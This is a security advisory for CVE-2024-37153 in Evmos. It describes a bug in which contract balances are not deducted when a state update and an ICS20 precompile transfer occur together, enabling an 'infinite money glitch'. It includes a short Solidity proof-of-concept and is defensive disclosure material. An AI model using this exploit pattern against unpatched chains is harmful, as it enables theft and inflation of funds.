# [H] Contract balance not updating correctly after interchain transaction

## Summary
Severity: High
Chain: github.com/evmos/evmos/v18
Component: github.com/evmos/evmos/v18, github.com/evmos/evmos/v17, github.com/evmos/evmos/v16, github.com/evmos/evmos/v15, github.c
CVE: CVE-2024-37153
CWE: Always-Incorrect Control Flow Implementation
Published: 2024-06-06
Source: https://github.com/advisories/GHSA-xgr7-jgq3-mhmc
Type: github-advisory

## Details
### Summary
_Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server._

### Details
We discovered a bug walking through how to liquid stake using Safe which itself is a contract. The bug only appears when there is a local state change together with an ICS20 transfer in the same function and uses the contract's balance, that is using the contract address as the `sender` parameter in an ICS20 transfer using the ICS20 precompile

### Proof of Concept
```solidity
// This function does not reduce the contract balance correctly but liquid stakes correctly 
function transfer(
        string memory sourcePort,
        string memory sourceChannel,
        string memory denom,
        uint256 amount,
        string memory receiver,
        string memory evmosReceiver
    ) external returns (uint64 nextSequence) {
        counter += 1; # Only happens when there is a local state update together with an ICS20 Transfer
        Height memory timeoutHeight =  Height(100, 100);
        string memory memo = buildLiquidStakeMemo(receiver, evmosReceiver);
        return ICS20_CONTRACT.transfer(
            sourcePort, 
            sourceChannel,
            denom,
            amount,
            address(this), # this is the sender address which is the contract
            receiver,
            timeoutHeight,
            0,
            memo
        );
    }
```

### Impact
This is in essence the "infinite money glitch" allowing contracts to double the supply of Evmos after each transaction.

### Severity

_Trimmed to 38 lines — full report: https://github.com/advisories/GHSA-xgr7-jgq3-mhmc_
